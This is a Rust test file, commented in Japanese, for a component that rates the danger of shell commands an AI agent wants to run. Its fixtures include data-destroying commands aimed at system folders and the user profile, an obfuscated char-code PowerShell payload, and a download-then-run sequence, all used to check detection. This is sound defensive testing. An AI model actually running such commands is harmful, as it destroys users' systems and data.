use std::collections::HashMap;
use std::sync::Mutex;

use async_trait::async_trait;
use harness_core::{
    Answers, CommandSubject, DecisionModel, DecodeOutcome, DecodedLayer, EncodedSource,
    FilePreview, LocatedSpan, PayloadEncoding, PermissionSubject, ProgramSubject, Question,
    RiskCheckError, TextEncoding,
};
use serde_json::{json, Value};

use super::*;

/// 問いの`id`ごとに決まった答えを返す判定モデル。危険度だけはコマンドの行ごとに変えられる。
/// 受けた呼び出し（state と問いの`id`）を控える。
struct FakeModel {
    risk: HashMap<String, f32>,
    needs_decoding: f32,
    reads_source: f32,
    sequence: f32,
    source: f32,
    truncated: bool,
    fail: bool,
    calls: Mutex<Vec<(Value, Vec<&'static str>)>>,
}

impl FakeModel {
    fn quiet() -> Self {
        Self {
            risk: HashMap::new(),
            needs_decoding: 0.05,
            reads_source: 0.05,
            sequence: 0.2,
            source: 0.1,
            truncated: false,
            fail: false,
            calls: Mutex::new(Vec::new()),
        }
    }

    fn with_risk(mut self, line: &str, score: f32) -> Self {
        self.risk.insert(line.to_string(), score);
        self
    }

    fn calls(&self) -> Vec<(Value, Vec<&'static str>)> {
        self.calls.lock().unwrap().clone()
    }
}

#[async_trait]
impl DecisionModel for FakeModel {
    async fn decide(
        &self,
        state: &Value,
        questions: &[Question],
    ) -> Result<Answers, RiskCheckError> {
        self.calls
            .lock()
            .unwrap()
            .push((state.clone(), questions.iter().map(|q| q.id).collect()));
        if self.fail {
            return Err(RiskCheckError("接続を拒まれた".into()));
        }
        let mut answers = serde_json::Map::new();
        for q in questions {
            let answer = match q.id {
                "risk" => {
                    let line = state["command"].as_str().unwrap_or_default();
                    json!({"score": self.risk.get(line).copied().unwrap_or(0.1)})
                }
                "needs_decoding" => json!({"noul": self.needs_decoding}),
                "reads_source" => json!({"noul": self.reads_source}),
                "sequence_risk" => json!({"score": self.sequence}),
                "source_risk" => json!({"score": self.source}),
                other => panic!("知らない問い: {other}"),
            };
            answers.insert(q.id.to_string(), answer);
        }
        Ok(Answers::new(Value::Object(answers), self.truncated))
    }
}

fn shell(line: &str) -> PermissionSubject {
    PermissionSubject::Command(CommandSubject::line_only(line))
}

fn with_preview(line: &str, path: &str, text: &str) -> PermissionSubject {
    let mut c = CommandSubject::line_only(line);
    c.previews.push(FilePreview {
        rel_path: path.into(),
        text: text.into(),
        truncated: false,
    });
    PermissionSubject::Command(c)
}

fn with_decoded(line: &str, text: &str) -> PermissionSubject {
    let mut c = CommandSubject::line_only(line);
    c.decoded.push(DecodedLayer {
        depth: 1,
        source: EncodedSource::EncodedCommand,
        outcome: DecodeOutcome::Text {
            encoding: TextEncoding::Utf16Le,
            text: text.into(),
        },
    });
    PermissionSubject::Command(c)
}

fn run(subject: &PermissionSubject, history: &[String], model: Option<&FakeModel>) -> RiskOutcome {
    run_with(subject, history, model, None)
}

fn run_with(
    subject: &PermissionSubject,
    history: &[String],
    model: Option<&FakeModel>,
    locator: Option<&FakeLocator>,
) -> RiskOutcome {
    let model = model.map(|m| m as &dyn DecisionModel);
    let locator = locator.map(|l| l as &dyn SpanLocator);
    futures::executor::block_on(assess(subject, history, model, locator)).expect("判定する材料")
}

/// 決まった箇所を答える、場所を選ばせる部品。呼ばれた行を控える。
struct FakeLocator {
    spans: Vec<LocatedSpan>,
    lines: std::sync::Mutex<Vec<String>>,
}

impl FakeLocator {
    fn answering(spans: Vec<LocatedSpan>) -> Self {
        Self {
            spans,
            lines: std::sync::Mutex::new(Vec::new()),
        }
    }
}

#[async_trait]
impl SpanLocator for FakeLocator {
    async fn locate(&self, line: &str) -> Result<Vec<LocatedSpan>, String> {
        self.lines.lock().unwrap().push(line.to_string());
        Ok(self.spans.clone())
    }
}

/// 「解読が要る」と出て機械の解読が何も取れていなければ、LLM に場所を選ばせてハーネスが解読し、
/// **解読した中身を機械の判定にも判定モデルにも通す**。注記は出さない（解読できたので）。
#[test]
fn a_located_payload_is_decoded_by_the_harness_and_judged() {
    let codes =
        "82,101,109,111,118,101,45,73,116,101,109,32,67,58,92,87,105,110,100,111,119,115,92,120";
    let line = format!("iex ([char[]]({codes}) -join '')");
    let mut model = FakeModel::quiet().with_risk(r"Remove-Item C:\Windows\x", 1.9);
    model.needs_decoding = 0.9;
    let locator = FakeLocator::answering(vec![LocatedSpan {
        text: codes.to_string(),
        encoding: PayloadEncoding::CharCodes,
    }]);
    let out = run_with(&shell(&line), &[], Some(&model), Some(&locator));
    assert_eq!(
        locator.lines.lock().unwrap().as_slice(),
        std::slice::from_ref(&line)
    );
    assert!(
        matches!(&out.extra_decoded[0].outcome, DecodeOutcome::Text { text, .. } if text == r"Remove-Item C:\Windows\x"),
        "{:?}",
        out.extra_decoded
    );
    assert!(
        out.reasons.iter().any(|r| matches!(
            r,
            RiskReason::Damage {
                origin: Origin::Decoded { depth: 1 },
                ..
            }
        )),
        "{:?}",
        out.reasons
    );
    assert!(
        out.reasons.iter().any(|r| matches!(
            r,
            RiskReason::Model {
                origin: Origin::Decoded { depth: 1 },
                ..
            }
        )),
        "{:?}",
        out.reasons
    );
    assert!(!out
        .notes
        .iter()
        .any(|n| matches!(n, RiskNote::UndecodedPayload { .. })));
}

/// LLM が示した箇所が行に無い・何も示さないときは、何も解読せず注記を残す。
/// 機械の解読が既に取れているとき・解読が要らないと出たときは、LLM を呼ばない。
#[test]
fn the_locator_is_used_only_when_needed_and_its_misses_are_noted() {
    let mut wants = FakeModel::quiet();
    wants.needs_decoding = 0.9;
    let invented = FakeLocator::answering(vec![LocatedSpan {
        text: "R2V0LURhdGU=".into(),
        encoding: PayloadEncoding::Base64,
    }]);
    let out = run_with(&shell("iex $x"), &[], Some(&wants), Some(&invented));
    assert!(out.extra_decoded.is_empty(), "行に無い文字列を解読した");
    assert!(out
        .notes
        .iter()
        .any(|n| matches!(n, RiskNote::UndecodedPayload { .. })));

    let unused = FakeLocator::answering(Vec::new());
    run_with(
        &with_decoded("pwsh -enc AAAA", "Get-Date"),
        &[],
        Some(&wants),
        Some(&unused),
    );
    let quiet = FakeModel::quiet();
    run_with(&shell("ls"), &[], Some(&quiet), Some(&unused));
    assert!(
        unused.lines.lock().unwrap().is_empty(),
        "要らないのに LLM を呼んだ"
    );
}

/// **判定モデルが無くても、機械の判定でシステムの場所を消す行は「高」になる。** 対照: 普通の行は「要確認」。
#[test]
fn without_the_model_the_machine_judgement_alone_decides() {
    let high = run(&shell(r"Remove-Item C:\Windows\System32\x"), &[], None);
    assert_eq!(high.severity(), Severity::High);
    assert_eq!(high.basis, RiskBasis::MachineOnly);
    assert!(matches!(
        &high.reasons[0],
        RiskReason::Damage {
            origin: Origin::Command,
            ..
        }
    ));
    let plain = run(&shell("ls"), &[], None);
    assert_eq!(plain.severity(), Severity::NeedsReview);
    assert_eq!(plain.basis, RiskBasis::MachineOnly);
    assert!(plain.reasons.is_empty() && plain.notes.is_empty());
}

/// 判定モデルへは**測った2つの形**で聞く——危険度だけ（state は`command`だけ）と、流れと一緒に4問。
#[test]
fn the_model_is_asked_in_the_two_measured_shapes() {
    let model = FakeModel::quiet();
    let history = vec!["git status".to_string()];
    run(&shell("ls"), &history, Some(&model));
    let calls = model.calls();
    assert_eq!(calls.len(), 2, "{calls:?}");
    assert!(
        calls.contains(&(json!({"command": "ls"}), vec!["risk"])),
        "{calls:?}"
    );
    assert!(
        calls.contains(&(
            json!({"command": "ls", "history": ["git status"]}),
            vec!["risk", "needs_decoding", "reads_source", "sequence_risk"]
        )),
        "{calls:?}"
    );
}

/// 判定モデルの危険度が線を越えたら「高」。越えなければ「要確認」のまま（**低いは安全の保証ではない**ので、
/// 低いことを理由に何かを足しもしない）。
#[test]
fn the_model_verdict_makes_it_high_only_past_the_line() {
    let high = run(
        &shell("rm -rf /tmp/x"),
        &[],
        Some(&FakeModel::quiet().with_risk("rm -rf /tmp/x", 1.7)),
    );
    assert_eq!(high.severity(), Severity::High);
    assert_eq!(high.basis, RiskBasis::WithModel);
    assert!(
        high.reasons[0].describe_ja().contains("1.70 / 2"),
        "{:?}",
        high.reasons
    );
    let low = run(
        &shell("cargo build"),
        &[],
        Some(&FakeModel::quiet().with_risk("cargo build", 1.26)),
    );
    assert_eq!(low.severity(), Severity::NeedsReview);
    assert_eq!(low.basis, RiskBasis::WithModel);
}

/// 流れの危険度は、**流れがあるときだけ**足す（空なら、コマンド単独の危険度と同じものを測っているだけ）。
#[test]
fn the_sequence_counts_only_when_there_is_a_history() {
    let mut model = FakeModel::quiet();
    model.sequence = 1.8;
    let with_history = run(
        &shell("pwsh -File a.ps1"),
        &["curl http://x/a.ps1 -o a.ps1".into()],
        Some(&model),
    );
    assert!(with_history
        .reasons
        .iter()
        .any(|r| matches!(r, RiskReason::Sequence(_))));
    let without = run(&shell("pwsh -File a.ps1"), &[], Some(&model));
    assert!(!without
        .reasons
        .iter()
        .any(|r| matches!(r, RiskReason::Sequence(_))));
}

/// 解読した中身は、機械の判定にも判定モデルにも通す（[BUG-224] の中身を見ずに通さない）。
#[test]
fn decoded_content_is_judged_by_both() {
    let decoded = r"Remove-Item C:\Windows\System32\drivers -Recurse";
    let subject = with_decoded("pwsh -enc AAAA", decoded);
    let machine_only = run(&subject, &[], None);
    assert!(
        machine_only.reasons.iter().any(|r| matches!(
            r,
            RiskReason::Damage {
                origin: Origin::Decoded { depth: 1 },
                ..
            }
        )),
        "{:?}",
        machine_only.reasons
    );
    let model = FakeModel::quiet().with_risk(decoded, 1.9);
    let both = run(&subject, &[], Some(&model));
    assert!(
        both.reasons.iter().any(|r| matches!(
            r,
            RiskReason::Model {
                origin: Origin::Decoded { depth: 1 },
                ..
            }
        )),
        "{:?}",
        both.reasons
    );
    assert!(
        model
            .calls()
            .iter()
            .any(|(state, _)| state == &json!({"command": decoded})),
        "解読した中身の危険度を聞いていない"
    );
}

/// 解読が要りそうなのに何も解読できていないときだけ注記する。解読できていれば注記しない。
#[test]
fn an_undecoded_payload_is_noted_only_when_nothing_was_decoded() {
    let mut model = FakeModel::quiet();
    model.needs_decoding = 0.9;
    let undecoded = run(
        &shell("iex ([char[]](115,121) -join '')"),
        &[],
        Some(&model),
    );
    assert!(undecoded
        .notes
        .iter()
        .any(|n| matches!(n, RiskNote::UndecodedPayload { .. })));
    let decoded = run(
        &with_decoded("pwsh -enc AAAA", "Get-Date"),
        &[],
        Some(&model),
    );
    assert!(!decoded
        .notes
        .iter()
        .any(|n| matches!(n, RiskNote::UndecodedPayload { .. })));
}

/// ファイルからコードを読むと判定されたら、縛ったファイルの中身の危険度も聞く。読まないと判定されたら聞かない。
/// `run_program`でコードを走らせるときは、判定に関わらず聞く。
#[test]
fn bound_files_are_asked_about_when_code_is_read_from_them() {
    let mut reading = FakeModel::quiet();
    reading.reads_source = 0.9;
    reading.source = 1.8;
    let out = run(
        &with_preview("pwsh ./setup.ps1", "setup.ps1", "Write-Host hi"),
        &[],
        Some(&reading),
    );
    assert!(
        out.reasons
            .iter()
            .any(|r| matches!(r, RiskReason::Model { origin: Origin::File { path }, .. } if path == "setup.ps1")),
        "{:?}",
        out.reasons
    );
    // 対照: 読まないと判定された（`cat notes.txt`）。
    let mut not_reading = FakeModel::quiet();
    not_reading.reads_source = 0.2;
    not_reading.source = 1.8;
    run(
        &with_preview("cat notes.txt", "notes.txt", "hello"),
        &[],
        Some(&not_reading),
    );
    assert!(!not_reading
        .calls()
        .iter()
        .any(|(_, ids)| ids == &vec!["source_risk"]));
    // `run_program`でインタプリタを起こす。
    let mut program = ProgramSubject::plain("python", vec!["build.py".into()]);
    program.previews.push(FilePreview {
        rel_path: "build.py".into(),
        text: "print(1)".into(),
        truncated: false,
    });
    let model = FakeModel::quiet();
    run(&PermissionSubject::Program(program), &[], Some(&model));
    assert!(model
        .calls()
        .iter()
        .any(|(state, ids)| ids == &vec!["source_risk"] && state["path"] == "build.py"));
}

/// 読む先を縛れていないのに「ファイルから読む」と出たら注記する（中身を見ていないことを隠さない）。
#[test]
fn reading_code_from_an_unbound_file_is_noted() {
    let mut model = FakeModel::quiet();
    model.reads_source = 0.9;
    let out = run(&shell(r"iex (gc .\a.ps1 -Raw)"), &[], Some(&model));
    assert!(out
        .notes
        .iter()
        .any(|n| matches!(n, RiskNote::UnboundSource { .. })));
}

/// **埋もれた1行は判定モデルが見落とす**ので、機械の判定がスクリプトの中身全体を見る。メモ（拡張子がスクリプトでない）は見ない。
#[test]
fn the_machine_judgement_reads_bound_scripts_but_not_notes() {
    let script = "Write-Host 1\nRemove-Item -Recurse -Force $env:USERPROFILE\nWrite-Host 2\n";
    let out = run(
        &with_preview(r"pwsh .\buried.ps1", "buried.ps1", script),
        &[],
        None,
    );
    assert!(
        out.reasons
            .iter()
            .any(|r| matches!(r, RiskReason::Damage { origin: Origin::File { path }, .. } if path == "buried.ps1")),
        "{:?}",
        out.reasons
    );
    // 対照: メモの中の行は、コードとして読めば当たる形（`rm -rf /`だけの行）にしてある——拡張子で外していることを確かめるため。
    let memo = "TODO\nrm -rf /\n";
    assert!(
        !system_damage::assess_line(memo).is_empty(),
        "対照が効いていない: コードとして読んでも当たらない中身になっている"
    );
    let notes = run(&with_preview("cat notes.txt", "notes.txt", memo), &[], None);
    assert!(notes.reasons.is_empty(), "{:?}", notes.reasons);
}

/// **拡張子の一覧がずれていた分も、いまは機械の判定が掛かる。**
///
/// 以前は承認でファイルを縛る側（`harness-tools`）と、中身へ機械の被害判定を掛ける側（ここ）が
/// 別々の一覧を持っていて中身がずれており、`.pyw`のようなファイルは**中身を読んでハッシュで縛り
/// 判定モデルへも送るのに、機械の被害判定だけ掛からない**状態だった（2026-10-04）。
/// ずれていた10種のうち、スクリプトとして中身が意味を持つものをここで固定する。
#[test]
fn the_extensions_that_used_to_be_missing_now_get_the_machine_judgement() {
    let script = "import shutil
shutil.rmtree('C:/Windows/System32')
";
    for ext in ["pyw", "mts", "cts", "pm", "vbe", "jse", "hta", "lua"] {
        let path = format!("clean.{ext}");
        let out = run(
            &with_preview(&format!("python {path}"), &path, script),
            &[],
            None,
        );
        assert!(
            out.reasons.iter().any(
                |r| matches!(r, RiskReason::Damage { origin: Origin::File { path: p }, .. } if *p == path)
            ),
            "{ext}: {:?}",
            out.reasons
        );
    }
    // `run_program`でコードを走らせる側は、もともと拡張子を問わず全部読む（対照）。
    let mut program = ProgramSubject::plain("python", vec!["clean.pyw".into()]);
    program.previews.push(FilePreview {
        rel_path: "clean.pyw".into(),
        text: script.into(),
        truncated: false,
    });
    let out = run(&PermissionSubject::Program(program), &[], None);
    assert!(
        out.reasons.iter().any(|r| matches!(
            r,
            RiskReason::Damage {
                origin: Origin::File { .. },
                ..
            }
        )),
        "{:?}",
        out.reasons
    );
}

/// 判定モデルが落ちていたら、機械の判定だけで決め、理由を1つだけ注記する。機械の判定の「高」は残る。
#[test]
fn a_failed_model_falls_back_to_the_machine_judgement_and_says_so_once() {
    let mut model = FakeModel::quiet();
    model.fail = true;
    let out = run(&shell(r"del /s /q C:\*"), &[], Some(&model));
    assert_eq!(out.basis, RiskBasis::MachineOnly);
    assert_eq!(out.severity(), Severity::High);
    assert_eq!(out.model_error(), Some("接続を拒まれた"));
    assert_eq!(
        out.notes
            .iter()
            .filter(|n| matches!(n, RiskNote::ModelUnavailable(_)))
            .count(),
        1
    );
}

/// 長いファイルは先頭だけ送ったと注記する。
#[test]
fn a_cut_file_is_noted() {
    let mut model = FakeModel::quiet();
    model.reads_source = 0.9;
    model.truncated = true;
    let out = run(
        &with_preview("pwsh ./a.ps1", "a.ps1", "Write-Host 1"),
        &[],
        Some(&model),
    );
    assert!(out
        .notes
        .iter()
        .any(|n| matches!(n, RiskNote::FileCut { path } if path == "a.ps1")));
}

/// 書込先・その他の材料は判定しない（承認画面に危険度の行を出さない）。
#[test]
fn write_paths_and_text_are_not_judged() {
    assert!(machine(&PermissionSubject::WritePath("a.txt".into())).is_none());
    assert!(machine(&PermissionSubject::Text("x".into())).is_none());
    assert_eq!(subject_line(&PermissionSubject::Text("x".into())), None);
}

/// 鍵は判定に使う材料で変わる——流れ・縛ったファイルの中身・解読した中身のどれが違っても別の鍵。
#[test]
fn the_cache_key_changes_with_every_input_of_the_judgement() {
    let base = cache_key(&with_preview("pwsh a.ps1", "a.ps1", "x"), &[]).unwrap();
    assert_ne!(
        base,
        cache_key(&with_preview("pwsh a.ps1", "a.ps1", "y"), &[]).unwrap()
    );
    assert_ne!(
        base,
        cache_key(&with_preview("pwsh a.ps1", "a.ps1", "x"), &["ls".into()]).unwrap()
    );
    assert_ne!(
        cache_key(&with_decoded("pwsh -enc A", "Get-Date"), &[]).unwrap(),
        cache_key(&with_decoded("pwsh -enc A", "Get-Item"), &[]).unwrap()
    );
}

/// 理由の文には判定モデルが返した文字列が入らない（数値と固定の言い回しだけ）。
#[test]
fn reasons_are_written_with_fixed_wording() {
    let verdict = RiskVerdict::from_score(1.6).unwrap();
    assert_eq!(
        RiskReason::Model {
            verdict,
            origin: Origin::File {
                path: "a.ps1".into()
            }
        }
        .describe_ja(),
        "判定モデル: 1.60 / 2（共有データを失う・本番を壊し得る）（a.ps1 の中）"
    );
    assert_eq!(Severity::High.label_ja(), "高");
    assert_eq!(Severity::NeedsReview.label_ja(), "要確認");
    assert_eq!(Severity::NeedsReview.summary_hint(), None);
}
